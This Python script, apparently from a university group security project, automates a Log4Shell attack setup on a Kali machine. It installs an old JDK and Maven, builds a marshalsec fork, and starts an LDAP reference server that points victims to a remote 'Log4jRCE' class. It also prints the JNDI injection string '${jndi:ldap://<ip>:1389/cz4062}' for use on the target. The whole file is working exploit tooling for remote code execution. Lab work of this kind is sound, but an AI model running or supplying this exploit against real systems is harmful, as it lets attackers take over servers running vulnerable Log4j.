#!/usr/bin/env python3

# Run program using the following syntax: python3 log4j.py <ip_address of kali machine>.  
# IP address above should be the one you get when running command: ip a s eth0

# Install JDK and all software required.

import subprocess
from os import path
import os
import sys
from ipaddress import IPv4Address


#1. Please specify ip address of this Kali machine as an argv.
try:
    # If IPv4Network(3rd parameter is not a valid ip range, then will kick you to the except block.)
    print(f"{IPv4Address(sys.argv[1])}")
    # If it is valid it will assign the ip_range from the 3rd parameter.
    ip_addr = sys.argv[1]
    print("Valid ip address entered through command-line.")
except:
    # Automatically get ip address
    lines = subprocess.check_output(["ip", "a", "s", "eth0"]).decode("utf-8").splitlines()
    for line in lines:
        if line.lstrip().startswith("inet"):
            ip_addr = line.lstrip().split(" ", 2)[1].split("/", 2)[0]
            break;

#2. Update Kali
print("**Updating Kali!**\n")
subprocess.run(["sudo", "apt", "update", "-y"])
subprocess.run(["sudo", "apt", "upgrade", "-y"])
subprocess.run(["sudo", "apt", "autoremove", "-y"])

#3. Download JDK
# Check if JDK is installed
try:
    jdk_check = subprocess.run(["javac", "-version"], capture_output=True)
    # Check if JDK is installed. The output shows up in the stderr instead of the stdout for some reason.
    print("\n**JDK already installed! Continuing!\n**")
except:
    # Download the correct version of the JDK.
    print("\n**Downloading JDK**\n")
    subprocess.run(["wget", "https://builds.openlogic.com/downloadJDK/openlogic-openjdk/8u362-b09/openlogic-openjdk-8u362-b09-linux-x64.tar.gz"])

#4. Install JDK
    #   Check if directory /opt/jdk exists. 
    if path.exists("/opt/jdk"):
        print("/opt/jdk already exists. Will now continue to extract.")
    else:
        subprocess.run(["sudo", "mkdir", "/opt/jdk"])
        subprocess.run(["sudo", "tar", "-zxf", "openlogic-openjdk-8u362-b09-linux-x64.tar.gz", "-C", "/opt/jdk"])
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/java", "java", "/opt/jdk/openlogic-openjdk-8u362-b09-linux-x64/bin/java", "100"])
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/javac", "javac", "/opt/jdk/openlogic-openjdk-8u362-b09-linux-x64/bin/javac", "100"])
        subprocess.run(["sudo", "update-alternatives", "--display", "java"])
        subprocess.run(["sudo", "update-alternatives", "--display", "javac"])
        subprocess.run(["sudo", "update-alternatives", "--set", "/opt/jdk/openlogic-openjdk-8u362-b09-linux-x64/bin/java"])
        subprocess.run(["java", "-version"])
        subprocess.run(["rm", "openlogic-openjdk-8u362-b09-linux-x64.tar.gz"])

#5. Install Maven
# Check if Maven is installed
try:
    mvn_check = subprocess.run(["mvn", "--version"], capture_output=True)
    print("\n**Apache Maven already installed! Continuing!\n**")
except:
    print("\n**Installing Maven!**\n")
    subprocess.run(["sudo", "apt", "install", "maven", "-y"])        
        
#6. Get MarshalSec repo
subprocess.run(["git", "clone", "https://github.com/CZ4062-Group-32/marshalsec.git"])

#7. Change directory
cwd = os.getcwd()
os.chdir("./marshalsec/")
print(os.listdir())
subprocess.run(["mvn", "clean", "package", "-DskipTests"])

#8. Run LDAP server. In terminal you need to add "" around the ip address. In subprocess.run this is not required.
try:
    print("Run")
    print("${jndi:ldap://" + ip_addr + ":1389/cz4062}")
    print("on the client after all python scripts are running!")
    subprocess.run(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip_addr}:8888/#Log4jRCE"])
except:
    print("Something went wrong. Please check that you have the correct ip address")
